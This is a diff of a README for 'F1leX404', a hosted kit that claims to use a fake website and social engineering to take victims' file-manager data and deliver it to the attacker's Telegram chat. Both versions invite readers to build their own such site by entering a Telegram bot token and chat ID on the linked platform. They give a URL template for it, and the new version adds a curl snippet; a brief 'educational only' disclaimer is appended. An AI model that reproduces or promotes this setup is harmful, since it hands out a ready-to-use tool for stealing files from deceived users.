@@ -1,39 +1,55 @@
-# F1leX404 
+## F1leX404
 
-This project demonstrates how hackers use social engineering to access a user's file manager data through a malicious website. Learn how this method works and how to prevent it. 
+This project demonstrates how hackers use social engineering to access a user's file manager data through a malicious website. Learn how this method works and how to prevent it.
+
+---
 
 ## 🧠 How It Works
 
 Hackers create fake websites and use **social engineering** to manipulate users into interacting with them. Once a user engages, the attacker can gain access to sensitive data stored on their file system. 🕵️‍♂️
 
-📸 **Check how data is received on [Telegram](https://i.postimg.cc/ZKWJH5RZ/IMG-20250714-233240.jpg)**
+**📸 Data Reception on Telegram**
 
-🎥 Watch the attack demonstration here:  
-[![How Hackers Trick Users](https://img.youtube.com/vi/8tWrX9j5Nuo/0.jpg)](https://youtu.be/8tWrX9j5Nuo)  
-**Click on the image to watch the video.**
+![Telegram Data Access](https://i.postimg.cc/ZKWJH5RZ/IMG-20250714-233240.jpg)
 
-## ⚙️ Build Your Own Malicious Website
+**🎥 Attack Demonstration**
+[![YouTube Demo](https://img.icons8.com/color/48/000000/youtube-play.png)](https://youtu.be/8tWrX9j5Nuo)
+*Click the icon to watch on YouTube.*
 
-You can create a similar setup by entering your own **Telegram Bot Token** and **Chat ID** on the platform below. Be careful with your credentials! 🔒
+---
 
-🔗 [Create Your Website](https://cinemaxhub.vercel.app/)
+## ⚙️ Build Your Own Test Site
 
-### 📚 Learn How to Get Your Token & Chat ID
-Follow this video to configure your Telegram Bot:  
-[![How to Get Token & Chat ID](https://img.youtube.com/vi/ZvCdiTS-uGw/0.jpg)](https://youtube.com/shorts/ZvCdiTS-uGw)  
-**Click on the image to watch the tutorial.**
+Create a similar setup by entering your **Telegram Bot Token** and **Chat ID** on the platform below 🔒
 
-## 🚀 Public Code vs. Optimized API
+[▶️ Launch Test Site](https://cinemaxhub.vercel.app/)
 
-🔓 **Public Code**: Great for studying, but slower.  
+---
 
-⚡ **Optimized API**: **40% faster** and more efficient. You’ll get **quicker results** with better performance. 
+## 📚 Setup Guide
 
-🔗 [API Documentation - Optimized Version](https://cinemaxhub.vercel.app/movie.html?token=<YOUR_TOKEN>&id=<YOUR_CHAT_ID>)
+1. **Get Your Telegram Bot Token** and **Chat ID** by following this tutorial:
+   [![YouTube Tutorial](https://img.icons8.com/color/48/000000/youtube-play.png)](https://youtube.com/shorts/ZvCdiTS-uGw)
+2. Store both values securely as environment variables or GitHub Secrets—**never** hard-code them.
 
-### 📋 API Usage
-You can copy and use the API endpoint below, but **make sure to replace** `<YOUR_TOKEN>` and `<YOUR_CHAT_ID>` with your own credentials. **Don't expose them publicly**. Use environment variables or GitHub Secrets to store sensitive information securely. 🔐
+---
+
+## 🚀 Performance Comparison
+
+| Variant         | Speed          | Use-Case                   |
+| --------------- | -------------- | -------------------------- |
+| 🌐 Public Code  | Slower         | Study, audit, learn        |
+| ⚡ Optimized API | **40% faster** | Controlled red-team drills |
+
+---
+
+## 📋 Quick API Snippet
 
 ```bash
-https://cinemaxhub.vercel.app/movie.html?token=YOUR_TOKEN&i
-d=YOUR_CHAT_ID
+# Copy and paste this in your terminal:
+curl "https://cinemaxhub.vercel.app/movie.html?token=$TELEGRAM_BOT_TOKEN&id=$TELEGRAM_CHAT_ID"
+```
+
+> **⚠️ Warning:** This project is **educational only**. Do **not** engage in unauthorized access or use for malicious purposes. **Always obtain explicit consent** before performing any security testing.
+
+---
